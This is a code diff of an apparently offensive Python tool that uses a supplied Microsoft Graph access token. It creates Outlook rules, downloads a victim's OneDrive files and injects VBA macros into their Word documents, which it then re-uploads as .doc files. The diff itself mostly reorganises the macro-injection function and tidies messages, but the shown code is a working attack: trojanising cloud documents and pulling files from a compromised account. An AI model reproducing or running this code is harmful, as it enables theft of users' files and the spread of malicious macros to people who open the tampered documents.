@@ -15,7 +15,6 @@ import crayons
 parser = argparse.ArgumentParser()
 parser.add_argument('-t', '--token', help='Access_token', required=True)
 parser.add_argument('-v', '--verbose', help='Display Mails', required=False, action='store_true')
-parser.add_argument('-e', '--entity', help='Output with html tags', required=False, action='store_true')
 arg = parser.parse_args()
 
 ####################################################################################################################################
@@ -143,74 +142,72 @@ def createRules():
     if response.status_code == 201:
         print(crayons.green('[+] Outlook rules created'))
 
-
     else:
         print(crayons.red('[-] Rules not created'))
 
 
 def createmacros(docxfile,itemId,name):
     
-    
-    currentPath = os.getcwd()
-    currentPath = currentPath.replace("\\\\", "/")
-    currentPath = currentPath.replace("\\", "/")
-    
-    vbs = '''
-        Dim wdApp
-        Set wdApp = CreateObject("Word.Application")
-        wdApp.Documents.Open("[currentPath]/[docxfile]")
-        wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "[macros]"
-        wdApp.Documents(1).SaveAs2 "[currentPath]/[output]", 0
-        wdApp.Quit
-    '''
-    output = docxfile.replace(".docx", ".doc")
-    vbs = vbs.replace("[currentPath]", currentPath)
-    vbs = vbs.replace("[docxfile]", docxfile)
-    vbs = vbs.replace("[macros]", macros)
-    vbs = vbs.replace("[output]", output)
-    
-    f = open("temp.vbs", "w")
-    f.write(vbs)
-    f.close()
-    
-    os.system("cscript temp.vbs")    
-    path = (currentPath + "/"+output).replace("\\","/")
-    try:
-        f = open(path, "r", errors='ignore')
-        content = f.read()
+    if os.path.isfile(macros):
+        currentPath = os.getcwd()
+        currentPath = currentPath.replace("\\\\", "/")
+        currentPath = currentPath.replace("\\", "/")
         
-    except Exception as e:
-        print(e)
-    
-    
-    name = name.replace(".docx",".doc")
-    data = '{ "name": "[name]" }'
-    data = data.replace("[name]", name)
-    response = requests.patch("https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId, headers={"Authorization":token,"Content-Type":"application/json"}, data = data)
-    
-    if response.status_code == 200:
-        print(crayons.green("[+]File renamed to doc!"))
-    else:
-        print(crayons.red("[-]File not renamed!, If this happend it is really very strange :("))
+        vbs = '''
+            Dim wdApp
+            Set wdApp = CreateObject("Word.Application")
+            wdApp.Documents.Open("[currentPath]/[docxfile]")
+            wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "[macros]"
+            wdApp.Documents(1).SaveAs2 "[currentPath]/[output]", 0
+            wdApp.Quit
+        '''
+        output = docxfile.replace(".docx", ".doc")
+        vbs = vbs.replace("[currentPath]", currentPath)
+        vbs = vbs.replace("[docxfile]", docxfile)
+        vbs = vbs.replace("[macros]", macros)
+        vbs = vbs.replace("[output]", output)
         
-    
-    with open(path, 'rb') as content:
-        response = requests.put(" https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId +"/content", headers={"Authorization":token, "Content-Type":"application/vnd.openxmlformats-officedocument.wordprocessingml.document"}, data = content)
+        f = open("temp.vbs", "w")
+        f.write(vbs)
+        f.close()
+        
+        os.system("cscript temp.vbs")    
+        path = (currentPath + "/"+output).replace("\\","/")
 
-    if response.status_code == 200:
-        print(crayons.green("[+] Macros successfully injected!"))
-    else:
-        print(crayons.red("[-]Macros not injected, If this happend it is really very strange :("))
-        
-    #os.remove('del ' + folder + '/onedrive/'+ name)
+        try:
+            f = open(path, "r", errors='ignore')
+            content = f.read()
+            
+        except Exception as e:
+            print(e)
     
+        name = name.replace(".docx",".doc")
+        data = '{ "name": "[name]" }'
+        data = data.replace("[name]", name)
+        response = requests.patch("https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId, headers={"Authorization":token,"Content-Type":"application/json"}, data = data)
+        
+        if response.status_code == 200:
+            print(crayons.green("[+] File renamed to .doc!"))
+        else:
+            print(crayons.red("[-] File not renamed!"))         
+        
+        with open(path, 'rb') as content:
+            response = requests.put(" https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId +"/content", headers={"Authorization":token, "Content-Type":"application/vnd.openxmlformats-officedocument.wordprocessingml.document"}, data = content)
+
+        if response.status_code == 200:
+            print(crayons.green("[+] Macros successfully injected!"))
+        else:
+            print(crayons.red("[-] Macros not injected"))
+            
+    else:
+        print(crayons.red("[-] Macros file not found"))
 
 
 def onedrive():
     response = requests.get(" https://graph.microsoft.com/v1.0/me/drive/root/children", headers={"Authorization":token}).json()
     os.mkdir(folder + '/onedrive')
     value = 0
-    print(crayons.cyan('[!] Retrieving OneDrive files'))
+    print(crayons.yellow('[!] Retrieving OneDrive files'))
     while value >= 0:
         try:
             data = response['value'][value]['@microsoft.graph.downloadUrl']
@@ -218,7 +215,6 @@ def onedrive():
             itemId = response['value'][value]['id']     
             filename , extension = os.path.splitext(name)
             extension = extension.replace(".", '')
-            print(extension)
             if extension in extensions:
                 download = subprocess.check_output('curl ' + data + ' -o ' + folder + '/onedrive/'+ name)
                 print(crayons.yellow(name + ' Downloaded!'))
